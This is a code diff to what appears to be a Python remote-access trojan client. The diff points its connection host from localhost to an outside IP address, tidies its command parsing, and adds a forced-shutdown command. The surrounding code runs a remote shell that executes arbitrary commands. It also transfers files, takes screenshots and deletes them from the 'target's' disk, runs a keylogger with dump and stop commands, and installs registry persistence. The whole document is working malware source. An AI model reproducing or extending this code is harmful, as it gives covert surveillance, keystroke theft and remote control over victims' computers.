@@ -11,7 +11,7 @@ import time
 from vidstream import ScreenShareClient
 
 # Connection data
-HOST = '127.0.0.1'
+HOST = '188.251.33.6'
 PORT = 5555
 STREAMING_PORT = 9999
 streamFlag = 0
@@ -112,36 +112,36 @@ def shell():
         elif command == 'clear':
             pass
 
-        elif command[:3] == 'cd ': # Change to the specified directory
+        elif command.startswith('cd '): # Change to the specified directory
             os.chdir(command[3:])
 
-        elif command[:6] == 'upload':
+        elif command.startswith('upload'):
             downloadFileRecv(command[7:])
 
-        elif command[:8] == 'download':
+        elif command.startswith('download'):
             uploadFile(command[9:])
 
-        elif command[:10] == 'screenshot':
+        elif command.startswith('screenshot'):
             screenshot() # Take screenshot
             uploadFile('screen.png') # Send screenshot file
             os.remove('screen.png') # Remove screenshot from target's file system
 
-        elif command[:12] == 'keylog-start':
+        elif command.startswith('keylog-start'):
             keylog = keylogger.Keylogger()
             t = threading.Thread(target=keylog.start) # A new thread is initiated so the server can handle other commands while listening for keystrokes
             t.start()
             send(f"[+] Keylogger as been started on [{socket.gethostname()}]")
 
-        elif command[:11] == 'keylog-dump':
+        elif command.startswith('keylog-dump'):
             logs = keylog.getLog()
             send(logs)
 
-        elif command[:11] == 'keylog-stop':
+        elif command.startswith('keylog-stop'):
             keylog.deleteFile()
             t.join()
             send(f'''[+] The keylogger session at [{socket.gethostname()}] was ended by the host. Dump Files deleted''')
 
-        elif command[:11] == 'persistence':
+        elif command.startswith('persistence'):
             regName, copyName = command[12:].split(' ')
             persist(regName, copyName)
 
@@ -150,6 +150,9 @@ def shell():
 
         elif command.startswith('broadcast'):
             subprocess.Popen(command[10:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+
+        elif command.startswith('terminate-all'): # Force shutdown
+            os.system('shutdown /s /t 0')
 
         else:
             execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
